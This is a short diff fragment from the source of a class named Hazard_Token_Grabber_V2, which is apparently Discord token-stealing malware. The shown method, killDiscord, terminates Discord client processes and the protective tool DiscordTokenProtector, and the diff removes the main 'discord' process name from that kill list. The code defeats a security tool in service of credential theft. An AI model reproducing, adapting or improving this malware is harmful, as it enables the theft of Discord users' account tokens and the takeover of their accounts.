@@ -93,7 +93,7 @@ class Hazard_Token_Grabber_V2:
     def killDiscord(self):
         for proc in psutil.process_iter():
             if any(procstr in proc.name().lower() for procstr in\
-            ['discord', 'discordtokenprotector', 'discordcanary', 'discorddevelopment', 'discordptb']):
+            ['discordtokenprotector', 'discordcanary', 'discorddevelopment', 'discordptb']):
                 try:
                     proc.kill()
                 except psutil.NoSuchProcess:
